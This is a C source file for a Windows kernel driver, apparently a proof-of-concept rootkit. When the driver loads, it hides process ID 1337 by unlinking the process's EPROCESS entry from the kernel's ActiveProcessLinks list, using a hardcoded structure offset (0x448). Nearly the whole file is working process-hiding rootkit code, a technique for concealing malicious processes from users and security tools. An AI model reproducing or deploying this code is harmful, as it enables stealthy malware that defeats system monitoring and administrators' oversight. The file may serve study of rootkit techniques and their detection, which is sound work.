#include <ntifs.h>
#include <ntddk.h>

#include "driver.h"

VOID HideProcess(ULONG processID) {
    PEPROCESS process = NULL;
    PLIST_ENTRY previousProcess, nextProcess;

    if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)processID, &process))) {
        DbgPrint("[!] HideProcess driver: couldn't find process %d.\n", processID);

        return;
    }

    // TODO: display more informations about the process

    // retrieval of ActiveProcessLinks
    // TODO: dynamically use the appropriate offset based on the OS
    PLIST_ENTRY processActiveProcessLinks = (PLIST_ENTRY)((PUCHAR)process + 0x448);

    previousProcess = processActiveProcessLinks->Blink;
    nextProcess = processActiveProcessLinks->Flink;

    previousProcess->Flink = nextProcess;
    nextProcess->Blink = previousProcess;

    DbgPrint("[*] HideProcess driver: process %d has been hidden.\n", processID);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("[+] HideProcess driver: loaded.\n");

    HideProcess(1337); // pID

    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);

    DbgPrint("[-] HideProcess driver: unloaded.\n");
}
